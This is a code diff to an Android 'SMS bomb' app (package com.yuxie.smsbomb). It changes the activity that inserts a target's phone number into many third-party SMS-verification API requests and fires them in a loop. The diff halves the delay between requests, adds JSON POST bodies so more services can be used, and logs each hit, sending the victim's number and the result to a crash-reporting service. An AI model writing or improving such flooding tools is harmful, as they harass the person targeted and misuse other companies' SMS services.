@@ -5,6 +5,7 @@ import android.support.v4.content.ContextCompat;
 import android.support.v7.widget.AppCompatEditText;
 import android.support.v7.widget.AppCompatTextView;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.View;
 import android.widget.RelativeLayout;
 import android.widget.ScrollView;
@@ -20,6 +21,9 @@ import com.blankj.utilcode.util.AppUtils;
 import com.blankj.utilcode.util.KeyboardUtils;
 import com.blankj.utilcode.util.LogUtils;
 import com.blankj.utilcode.util.ToastUtils;
+import com.google.gson.Gson;
+import com.google.gson.JsonObject;
+import com.google.gson.JsonParser;
 import com.jaeger.library.StatusBarUtil;
 import com.tencent.bugly.crashreport.CrashReport;
 import com.yuxie.smsbomb.R;
@@ -27,6 +31,8 @@ import com.yuxie.smsbomb.api.ServerApiService;
 import com.yuxie.smsbomb.api.server.ServerApi;
 import com.yuxie.smsbomb.bean.SmsApi;
 import com.yuxie.smsbomb.utils.CRequest;
+
+import org.json.JSONObject;
 
 import java.net.MalformedURLException;
 import java.net.URL;
@@ -112,7 +118,7 @@ public class SmsApiActivity extends BaseActivity {
                 }
                 fire(phoneNumber, smsApi);
                 try {
-                    Thread.sleep(1000);
+                    Thread.sleep(500);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
@@ -161,26 +167,36 @@ public class SmsApiActivity extends BaseActivity {
             path = urlHost.getPath();
         } catch (MalformedURLException e) {
             e.printStackTrace();
+            Log.i("TAG", smsApi.getId() + "异常，url:" + smsApi.getUrl());
             return;
         }
 
         String url = smsApi.getUrl();
-
         String body = "";
 
-        if (url.contains("target_phone")) {
-            url = url.replace("target_phone", phoneNumber);
-            body = CRequest.TruncateUrlPage(url);
+        if ("post".equals(smsApi.getType())) {
+            if (url.contains("?")) {
+                url = url.replaceAll("target_phone", phoneNumber);
+                body = CRequest.TruncateUrlPage(url);
+                url = CRequest.UrlPage(url);
+            } else {
+                body = smsApi.getBody().replaceAll("target_phone", phoneNumber);
+            }
         } else {
-            body = smsApi.getParameterBefore() + phoneNumber + smsApi.getParameterAfter();
+            url = url.replaceAll("target_phone", phoneNumber);
+            body = CRequest.TruncateUrlPage(url);
         }
 
         ServerApiService serverApiService = ServerApi.getInstance(host);
-
         if ("post".equals(smsApi.getType())) {
-            Map<String, String> options = CRequest.URLRequestParameter(body);
-            mRxManager.add(serverApiService.getSmsApi(url, options).subscribeOn(Schedulers.io())
-                    .subscribe(new MySubscriber(phoneNumber, host, smsApi)));
+            if (body.contains("{") || body.contains("}")) {
+                mRxManager.add(serverApiService.getSmsApi(url, new JsonParser().parse(body).getAsJsonObject()).subscribeOn(Schedulers.io())
+                        .subscribe(new MySubscriber(phoneNumber, host, smsApi)));
+            } else {
+                Map<String, String> options = CRequest.URLRequestParameter(body);
+                mRxManager.add(serverApiService.getSmsApi(url, options).subscribeOn(Schedulers.io())
+                        .subscribe(new MySubscriber(phoneNumber, host, smsApi)));
+            }
         } else {
             if (!TextUtils.isEmpty(path)) {
                 path = path.substring(1);
@@ -210,18 +226,27 @@ public class SmsApiActivity extends BaseActivity {
 
         @Override
         public void onError(Throwable e) {
-
+            e.printStackTrace();
+            Log.i("TAG", smsApi.getId() + "异常_onError，url:" + smsApi.getUrl());
         }
 
         @Override
         public void onNext(Result<String> stringResult) {
+
+            if (stringResult.isError()) {
+                Log.i("TAG", smsApi.getId() + "_失败，url:" + url + "  ,body:" + stringResult.error());
+                msg("失败: " + url);
+                CrashReport.postCatchedException(new Throwable(phoneNumber + ":失败!" + ",信息:" + url + ",返回:" + stringResult.error()));
+                return;
+            }
             String body = stringResult.response().body();
-            LogUtils.i("url:" + url + ",body:" + body);
             if (!TextUtils.isEmpty(body) && body.contains(smsApi.getResultOk())) {
+                Log.i("TAG", smsApi.getId() + "_成功，url:" + url + "  ,body:" + body);
                 ++successTotol;
                 msg("成功: " + url);
                 CrashReport.postCatchedException(new Throwable(phoneNumber + ":成功!" + ",信息:" + url + ",返回:" + body));
             } else {
+                Log.i("TAG", smsApi.getId() + "_失败，url:" + url + "  ,body:" + body);
                 msg("失败: " + url);
                 CrashReport.postCatchedException(new Throwable(phoneNumber + ":失败!" + ",信息:" + url + ",返回:" + body));
             }
